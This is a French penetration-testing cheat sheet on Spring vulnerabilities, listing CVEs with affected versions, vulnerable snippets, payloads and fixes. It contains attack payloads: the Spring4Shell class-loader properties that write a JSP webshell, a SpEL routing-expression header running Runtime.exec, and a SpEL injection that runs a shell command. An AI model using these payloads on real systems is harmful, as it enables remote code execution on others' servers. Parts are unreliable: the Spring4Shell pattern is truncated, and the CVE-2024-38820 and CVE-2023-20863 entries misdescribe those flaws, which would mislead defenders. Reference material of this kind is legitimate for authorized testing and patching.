# Spring core

- Payloads d’injection endpoints Spring Core (boîte blanche)
  - CVE-2022-22965 (Spring4Shell)
    - Description : RCE via data binding, injection de propriétés internes sur Tomcat avec JDK ≥ 9.
    - Versions vulnérables : Spring Framework 5.2.0 à 5.2.19, 5.3.0 à 5.3.17
    - Exemple de code vulnérable :
      ```
      @PostMapping("/user")
      public String addUser(@ModelAttribute User user) {
          return "ok";
      }
      ```
    - Payloads boîte blanche :
      - POST data :
        ```
        class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bf%7Di
        class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
        class.module.classLoader.resources.context.parent.pipeline.first.directory=/usr/local/tomcat/webapps/ROOT
        class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
        class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
        ```
      - Permet d’écrire un webshell dans le répertoire web.
    - Correctif :
      - Mettre à jour Spring Framework ≥ 5.2.20 ou ≥ 5.3.18
      - Restreindre le binding avec `@InitBinder`
      - Désactiver le binding global sur les propriétés sensibles
  - CVE-2022-22963 (Spring Cloud Function)
    - Description : RCE via injection SpEL dans les headers HTTP, exécutant du code arbitraire.
    - Versions vulnérables : Spring Cloud Function 3.1.6, 3.2.2 et antérieures
    - Exemple de code vulnérable :
      ```
      @Bean
      public Function<String, String> demo() {
          return value -> value.toUpperCase();
      }
      ```
    - Payload boîte blanche :
      - Header HTTP :
        ```
        spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')
        ```
      - Permet l’exécution de commandes système.
    - Correctif :
      - Mettre à jour Spring Cloud Function ≥ 3.1.7 ou ≥ 3.2.3
      - Désactiver l’évaluation SpEL dans les headers
  - CVE-2023-20863 (SpEL Expression DoS)
    - Description : Evaluation non filtrée d’expressions SpEL pouvant causer un DoS ou un accès non autorisé.
    - Versions vulnérables : Spring Framework < 5.2.24, < 5.3.27, < 6.0.8
    - Exemple de code vulnérable :
      ```
      ExpressionParser parser = new SpelExpressionParser();
      parser.parseExpression(userInput).getValue();
      ```
    - Payload boîte blanche :
      - userInput :
        ```
        new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('sleep 10').getInputStream()).next()
        ```
      - Peut provoquer un blocage ou une exécution de commande.
    - Correctif :
      - Mettre à jour Spring Framework ≥ 5.2.24, ≥ 5.3.27, ≥ 6.0.8
      - Ne jamais parser d’input utilisateur sans filtrage strict
  - CVE-2024-38820 (Désérialisation non sécurisée)
    - Description : Désérialisation d’objets non fiables menant à une exécution de code arbitraire.
    - Versions vulnérables : Spring Framework 5.x et 6.x (avant correctif 2024)
    - Exemple de code vulnérable :
      ```
      ObjectInputStream ois = new ObjectInputStream(inputStream);
      Object obj = ois.readObject();
      ```
    - Payload boîte blanche :
      - Envoyer un objet Java sérialisé malveillant sur l’endpoint acceptant le flux binaire.
    - Correctif :
      - Ne jamais désérialiser d’objets non fiables
      - Utiliser des formats sûrs (JSON, YAML) avec des parseurs sécurisés
